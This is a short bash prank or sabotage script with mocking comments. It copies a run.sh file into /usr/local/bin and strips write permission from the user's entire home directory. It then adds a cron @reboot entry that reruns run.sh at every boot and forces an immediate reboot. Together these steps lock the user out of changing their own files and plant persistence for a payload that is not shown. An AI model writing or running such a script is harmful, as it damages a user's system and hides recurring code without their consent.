#!/bin/bash

# hehe
cp /home/$(whoami)/run.sh /usr/local/bin/run.sh
chmod +x /usr/local/bin/run.sh

# time for funni
chmod -R a-w /home/$(whoami)

# lol gl
(crontab -l 2>/dev/null; echo "@reboot /bin/bash /usr/local/bin/run.sh") | crontab -

# bye-bye sweetheart~
shutdown -r now
